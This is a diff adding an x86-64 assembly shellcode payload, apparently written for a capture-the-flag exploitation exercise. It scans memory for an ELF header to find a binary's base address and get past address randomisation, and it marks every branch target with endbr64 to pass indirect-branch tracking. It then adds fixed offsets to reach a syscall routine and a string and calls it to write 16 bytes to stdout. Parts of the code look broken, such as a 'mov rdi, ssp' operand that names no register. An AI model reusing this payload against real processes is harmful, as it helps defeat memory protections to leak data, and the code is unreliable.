@@ -1,0 +1,60 @@
+global _start
+
+section .text
+_start:
+    endbr64
+    xor rdi, rdi
+    mov rdi, ssp
+
+loop:
+    endbr64
+    mov al, byte [rdi]
+    cmp al, 0x7f
+    jne continue_loop
+
+    mov al, byte [rdi + 1]
+    cmp al, 0x45
+    jne continue_loop
+
+    mov al, byte [rdi + 2]
+    cmp al, 0x4c
+    jne continue_loop
+
+    mov al, byte [rdi + 3]
+    cmp al, 0x46
+    jne continue_loop
+
+    mov al, byte [rdi + 4]
+    cmp al, 0x02
+    jne continue_loop
+
+    mov al, byte [rdi + 5]
+    cmp al, 0x01
+    jne continue_loop
+
+    jmp found
+
+continue_loop:
+    endbr64
+    inc rdi
+    jmp loop
+
+found:
+    endbr64
+; save the base in rax
+    mov rax, rdi
+; add syscall offset to rax
+    add ax, 0x1110
+; add string offset
+    add di, 0x2160
+; move the string to rdx
+    mov rdx, rdi
+; set rdi (sysno)
+    mov dil, 0x1
+; set rsi (fd)
+    mov sil, 0x1
+; set r10 (count)
+    mov r10b, 0x10
+    
+    call [rax]
+
